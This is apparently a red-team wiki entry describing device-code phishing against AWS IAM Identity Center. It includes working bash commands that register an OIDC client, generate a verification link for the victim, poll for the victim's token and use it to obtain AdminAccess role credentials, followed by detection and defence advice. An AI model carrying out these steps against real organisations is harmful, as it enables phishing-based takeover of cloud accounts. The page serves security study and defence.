---
title: AWS SSO device-code phishing
slug: aws-sso-device-code-phishing
---

> **TL;DR:** Trick a target into completing an IAM Identity Center device-authorization flow and you get an SSO access token good for every permission set assigned to them, with a refresh window that survives password resets.

## What it is
IAM Identity Center (the artist formerly known as AWS SSO) supports the OAuth 2.0 device authorization grant: a registered client requests a `device_code` + `user_code`, the user visits a verification URL and types the code, and the client polls until a long-lived `access_token` and `refresh_token` come back. Anyone can register a public OIDC client against an Identity Center start URL without authentication, so the phisher only needs the org's start URL (`<id>.awsapps.com/start`) and a believable lure to send the user to the verification page. Once the user approves, the token assumes any permission set across any AWS account the user has access to.

## Preconditions / where it applies
- Target org uses IAM Identity Center with device-code-capable clients allowed (default).
- Knowledge of the target's start URL or Identity Center region.
- A delivery vector for the `user_code` + URL (Slack, email, lookalike CLI prompt).

## Technique
1. Register an OIDC client against the Identity Center region.
2. Start a device-authorization flow, capture `user_code` and `verification_uri_complete`.
3. Send the URL to the victim; poll the token endpoint until approval.
4. Use the access token to list account/role assignments and mint role credentials.

```bash
REGION=us-east-1
START=https://example.awsapps.com/start
CLIENT=$(aws sso-oidc register-client --client-name redteam --client-type public --region $REGION)
CID=$(echo $CLIENT | jq -r .clientId); CSEC=$(echo $CLIENT | jq -r .clientSecret)
DEV=$(aws sso-oidc start-device-authorization --client-id $CID --client-secret $CSEC \
       --start-url $START --region $REGION)
echo "Send victim: $(echo $DEV | jq -r .verificationUriComplete)"
```

```bash
# Poll until they approve
while true; do
  TOK=$(aws sso-oidc create-token --client-id $CID --client-secret $CSEC \
          --grant-type "urn:ietf:params:oauth:grant-type:device_code" \
          --device-code "$(echo $DEV|jq -r .deviceCode)" --region $REGION 2>/dev/null)
  [ -n "$TOK" ] && echo "$TOK" && break
  sleep 5
done
AT=$(echo $TOK | jq -r .accessToken)
```

```bash
# Burn down the keys
aws sso list-accounts --access-token $AT --region $REGION
aws sso list-account-roles --access-token $AT --region $REGION --account-id 111122223333
aws sso get-role-credentials --access-token $AT --region $REGION \
  --account-id 111122223333 --role-name AdminAccess
```

## Detection and defence
- CloudTrail in the management account: alert on `sso-oidc:CreateToken` from unusual user-agents or IPs, and on `sso:GetRoleCredentials` immediately followed by privileged calls.
- Reduce session lifetime, enforce MFA on the Identity Center sign-in (not just the upstream IdP), and disable the device-code grant if not needed.
- Train users that the `user_code` page is sensitive — same threat model as MFA code phishing.
- Related: [[entra-device-code-prt-pivot]], [[aws-iam-enum]].

## References
- [christophetd — Phishing for AWS credentials via Identity Center device code](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/) — original PoC and CLI walkthrough.
- [AWS — IAM Identity Center OIDC API](https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/Welcome.html) — endpoint reference for the device flow.
